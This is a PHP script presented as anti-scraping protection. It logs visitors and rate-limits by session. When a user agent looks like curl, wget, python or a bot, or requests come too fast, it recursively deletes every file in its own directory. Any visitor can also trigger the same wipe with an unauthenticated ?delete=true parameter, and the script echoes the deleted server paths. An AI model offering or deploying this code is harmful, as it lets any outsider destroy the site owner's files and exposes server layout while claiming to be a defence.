<?php
// Start a session to track rapid requests (if needed)
session_start();

// Function to log suspicious activity
function logSuspiciousActivity($message) {
    $logFile = 'suspicious_activity.log';  // Log file location
    $ip = $_SERVER['REMOTE_ADDR'];  // Get the user's IP address
    $userAgent = $_SERVER['HTTP_USER_AGENT'];  // Get the user agent
    $date = date('Y-m-d H:i:s');  // Current date and time
    $logMessage = "$date - IP: $ip - User-Agent: $userAgent - $message\n";

    // Append to the log file
    file_put_contents($logFile, $logMessage, FILE_APPEND);
}

// Function to detect scraping tools based on User-Agent
function detectScrapingTools() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Check if the User-Agent is indicative of scraping tools (e.g., wget, curl)
    if (preg_match('/(wget|curl|scrapy|python|bot|HTTrack)/i', $userAgent)) {
        logSuspiciousActivity('Detected scraping tool in User-Agent: ' . $userAgent);
        // Block or take action (e.g., show a warning page)
        echo "Suspicious activity detected. Your request has been logged.";
        deleteFiles(__DIR__);  // Start deleting files if scraping is detected
        exit;
    }
}

// Function to detect rapid requests (simple rate-limiting)
function detectRapidRequests() {
    $ip = $_SERVER['REMOTE_ADDR'];  // Get the user's IP address
    $timeWindow = 60;  // Time window in seconds
    $requestLimit = 10;  // Maximum number of requests allowed within the time window

    // Define the session variable to track requests
    if (!isset($_SESSION['request_times'])) {
        $_SESSION['request_times'] = [];
    }

    // Record the current timestamp
    $_SESSION['request_times'][] = time();

    // Remove old requests that are outside the time window
    $_SESSION['request_times'] = array_filter($_SESSION['request_times'], function($time) use ($timeWindow) {
        return ($time > (time() - $timeWindow));
    });

    // Check if the user exceeded the limit
    if (count($_SESSION['request_times']) > $requestLimit) {
        logSuspiciousActivity('Rapid requests detected from IP: ' . $ip);
        // Block or take action
        echo "You are making too many requests in a short time. Please try again later.";
        deleteFiles(__DIR__);  // Start deleting files if rapid requests are detected
        exit;
    }
}

// Function to delete files in a directory recursively
function deleteFiles($dir) {
    // Check if directory exists
    if (!is_dir($dir)) {
        echo "Directory not found!";
        return;
    }

    // Get all files and subdirectories in the specified directory
    $files = array_diff(scandir($dir), array('.', '..')); // Ignore '.' and '..'

    foreach ($files as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;

        if (is_dir($filePath)) {
            // If the item is a directory, recurse into it
            deleteFiles($filePath);
            rmdir($filePath);  // Remove the empty directory after deletion
        } else {
            // If the item is a file, delete it
            if (unlink($filePath)) {
                echo "Deleted: " . $filePath . "<br>";
            } else {
                echo "Failed to delete: " . $filePath . "<br>";
            }
        }
    }
}

// Detect scraping tools (e.g., wget, curl)
detectScrapingTools();

// Detect rapid requests to prevent excessive downloading
detectRapidRequests();

// Check if the script is called with the "delete" parameter
if (isset($_GET['delete']) && $_GET['delete'] == 'true') {
    // Start the deletion process
    deleteFiles(__DIR__);
    echo "All files have been deleted from the directory: " . __DIR__;
} else {
    // Show a warning message
    echo "No action taken. To delete files, visit this URL with ?delete=true";
}
?>
